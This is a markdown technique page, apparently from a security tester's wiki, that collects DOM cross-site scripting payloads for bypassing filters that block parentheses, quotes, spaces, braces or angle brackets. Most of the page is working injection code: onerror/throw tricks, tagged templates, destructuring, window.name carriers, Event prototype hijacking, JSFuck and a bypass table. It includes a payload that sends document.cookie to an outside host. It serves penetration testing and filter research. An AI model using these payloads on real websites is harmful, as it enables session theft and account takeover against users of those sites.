---
title: DOM XSS — Restricted Character Bypass
slug: restricted-character-bypass
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/restricted-character-bypass]
inbound: []
---

# DOM XSS — Restricted Character Bypass

## Pattern

When the injection context strips or blocks specific characters — parentheses `()`, backticks, quotes, spaces, curly braces, angle brackets, or semicolons — alternative JavaScript syntax still enables execution. Techniques include: exception-handling with `throw`/`onerror` (no parens needed to call a function), template literals as tagged calls, `window.name` as eval-payload carrier, ES6 destructuring, Symbol.hasInstance, and Event prototype hijacking with Error objects.

## Preconditions

- JavaScript injection context (inside `<script>` block or event handler attribute).
- One or more character classes are filtered, escaped, or blocked.
- `onerror` global is writeable (not overridden by the application to a no-op).
- For `window.name` vectors: attacker can control the opener window's name attribute (e.g. via a cross-origin `window.open` or iframe `name=`).

## Detection

- Test oracle: inject `alert(1)` — if blocked, remove `(` `)` and retry with `alert\`1\``.
- Fuzz systematically: which of `()`, `\`\``, `[]`, `{}`, `;`, `,`, `'`, `"`, space are stripped?
- `js_analyzer` annotation: injection into JS string literal context with character filtering.

## Triggering

### No parentheses

```javascript
// Exception handling: onerror = alert, throw integer
<script>onerror=alert;throw 1</script>

// No semicolons
<script>{onerror=alert}throw 1</script>

// Using comma expression
<script>throw onerror=alert,1</script>

// String eval on Chrome/Edge
<script>throw onerror=eval,'=alert\x281\x29'</script>

// String eval on Safari
<script>throw onerror=eval,'alert\x281\x29'</script>

// Object eval on Firefox
<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>

// Object eval on Firefox/Safari (Error object)
<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>

// Location hash eval (all browsers)
<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>

// Template strings
<script>alert`1`</script>

// Template strings with location hash payload
<script>new Function`X${document.location.hash.substr`1`}`</script>

// No parens, no spaces
<script>Function`X${document.location.hash.substr`1`}```</script>

// ES6 Symbol.hasInstance
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>

// ES6 Symbol.hasInstance without dot
<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>

// Location redirect (no parens)
<script>location='javascript:alert\x281\x29'</script>

// Location redirect no strings (payload in window.name)
<script>location=name</script>
```

### No parentheses, no quotes

```javascript
// No parens, no quotes, no spaces
<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>

// No parens, no quotes, no spaces, no curly brackets
<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>
```

### Destructuring

```javascript
// Array destructuring
<script>throw[onerror]=[alert],1</script>

// Destructuring with assignment
<script>var{a:onerror}={a:alert};throw 1</script>

// Destructuring with default values
<script>var{haha:onerror=alert}=0;throw 1</script>
```

### window.name as payload carrier

```javascript
// Set via script, execute via location
<script>window.name='javascript:alert(1)';</script><svg onload=location=name>

// throw + eval + name
<script>throw onerror=eval,name</script>

// onerror + new operator
<script>onerror=eval,new name</script>
```

### No greater-than (unclosed tags)

```html
<!-- XSS without > -->
<svg onload=alert(1)

<!-- XSS without > using HTML comment -->
<svg onload=alert(1)<!--
```

### Cookie exfiltration without parens, backticks, or quotes

```html
<video><source onerror=location=/\02.rs/+document.cookie>
```

### Event prototype hijacking (no parens, uses Error objects)

```javascript
// URIError (ondevicemotion)
<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\x281\x29'</script>

// RangeError (onmessage via iframe)
<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name="alert\x281\x29">';target.onload=setTimeout(function(){frames[0].postMessage("", "*")},100)</script>

// Arrow function (transition events)
<img/src/style=transition:0.1s onerror="window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\x281\x29'">

// DOMException (onload)
<img/src/onerror="window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\x281\x29'">
```

### Payload concealed in attributes / URL

```javascript
// Attributes array with src=1 trigger
<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>

// SVG with window.name
<svg onload="attributes[0].value=name,new onload">

// SVG with URL + template string (payload in URL fragment)
<svg onload="attributes[0].value=id+URL+id,new onload" id=`>

// Input with URL + template string
<input onfocus="attributes[0].value=id+URL+id,new onfocus" id=` autofocus>

// innerHTML decode URL then eval textContent
<svg onload=innerHTML=URL,eval(textContent)>
<img/src/onerror=innerHTML=URL,innerHTML=textContent>
```

### JSFuck (no letters, only uppercase context)

```html
<!-- Uppercase-only context via JSFuck inline -->
<SCRIPT>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]...alert(1)...</SCRIPT>
```

## Bypasses

| Restriction | Technique |
|---|---|
| No `()` | `onerror=alert;throw 1` / template literal tagged call |
| No `()` or backticks | `Symbol.hasInstance`, destructuring, Error-object Event prototype |
| No quotes | `location=name` / `throw onerror=eval,name` |
| No spaces | `{onerror=alert}throw 1` / regex form |
| No `{}` | throw regex + hash form |
| No `>` | unclosed tag `<svg onload=alert(1)` |
| No semicolons | comma expressions, `throw` with comma |
| Uppercase only | JSFuck or `<SCRIPT SRC=HTTPS://...>` |
| Payload visible in DOM | Conceal in `window.name`, URL fragment, or attribute value |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed., Restricted Characters section)
